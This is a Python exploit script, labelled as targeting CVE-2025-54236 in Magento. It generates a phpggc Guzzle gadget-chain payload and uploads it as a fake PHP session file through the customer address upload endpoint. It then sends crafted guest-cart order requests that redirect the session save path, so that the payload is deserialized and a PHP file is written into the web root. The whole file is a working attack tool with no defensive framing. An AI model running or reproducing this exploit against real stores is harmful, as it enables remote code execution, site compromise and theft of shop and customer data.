import subprocess
import string
import requests
import json
import argparse
from clogsec import Logger
import secrets
import os

logger = Logger(file_name="cve‑2025‑54236", log_level="INFO", correlation_id="cve‑2025‑54236")

def gen_form_key(length=16):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def gen_sessid(length=26):
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

FORMKEY = gen_form_key(16)
SESSID = gen_sessid(26)

def run_phpggc(payload_out, payload_in):
    try:
        result = subprocess.run(['./phpggc', '-se', '-pub', '-a', 'Guzzle/FW1', payload_out, payload_in], capture_output=True, text=True, check=True)
        logger.info(result.stdout)
        with open('/tmp/sess_' + SESSID, 'w') as f:
            f.write(result.stdout)
    except subprocess.CalledProcessError as e:
        logger.error(f"Error running phpggc: {e}")
        logger.error(e.stdout)
        logger.error(e.stderr)


def upload_file():
    files = {
        'form_key': FORMKEY, 
        f"custom_attributes[country_id]": (f"/tmp/sess_{SESSID}", open(f"/tmp/sess_{SESSID}", "rb")) if os.path.exists(f"/tmp/sess_{SESSID}") else (None, "")
        }
    try:
        response = requests.post(f"{HOST}/customer/address_file/upload", files=files, cookies={"form_key": FORMKEY})
        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        logger.info(f"File upload response: {response.status_code}")
        data = response.json()
        logger.info("[+] data", data)
        if "file" in data:
            fileName = data["file"] #/t/e/ + filename
        else:
            fileName = "/s/e/sess_" + SESSID
        return fileName
    except requests.exceptions.RequestException as e:
        logger.error(f"Error uploading file: {e}")
        fileName = "/s/e/sess_" + SESSID
        return fileName

def create_order():
    headers = {
        'Accept': 'application/json'
    }
    cookies = {
        'PHPSESSID': SESSID
    }
    payload = {
        "paymentMethod": {
            "paymentData": {
                "context": {
                    "urlBuilder": {
                        "session": {
                            "sessionConfig": {
                                "savePath": "media/customer_address/s/e"
                            }
                        }
                    }
                }
            }
        }
    }

    try:
        response = requests.put(f"{HOST}/rest/default/V1/guest-carts/abc/order", headers=headers, cookies=cookies, json=payload)
        response.raise_for_status()
        logger.info(f"Order creation response: {response.status_code}")
        logger.info(response.text)
    except requests.exceptions.RequestException as e:
        logger.error(f"Error creating order: {e}")

def create_order2(fileName):
    headers = {
        'Accept': 'application/json'
    }
    cookies = {
        'PHPSESSID': SESSID
    }
    payload = {
        "paymentMethod": {
            "paymentData": {
                "context": {
                    "urlBuilder": {
                        "session": {
                            "sessionConfig": {
                                "savePath": f"media/customer_address{fileName}"
                            }
                        }
                    }
                }
            }
        }
    }

    try:
        response = requests.put(f"{HOST}/rest/default/V1/guest-carts/abc/order", headers=headers, cookies=cookies, json=payload)
        response.raise_for_status()
        logger.info(f"Order creation response: {response.status_code}")
        logger.info(response.text)
    except requests.exceptions.RequestException as e:
        logger.error(f"Error creating order: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Magento Exploit Script")
    parser.add_argument("--host", type=str, default="http://example.com", help="Target Magento host URL")
    parser.add_argument("--payload_in", type=str, default="/tmp/payload.php", help="Path to the input payload file")
    parser.add_argument("--payload_out", type=str, default="/var/www/html/magento2/pub/exploit.php", help="Path to the output exploit file")

    args = parser.parse_args()

    HOST = args.host
    PAYLOAD_IN = args.payload_in
    PAYLOAD_OUT = args.payload_out

    run_phpggc(PAYLOAD_OUT, PAYLOAD_IN)

    fileName = upload_file()
    create_order()
    create_order2(fileName)
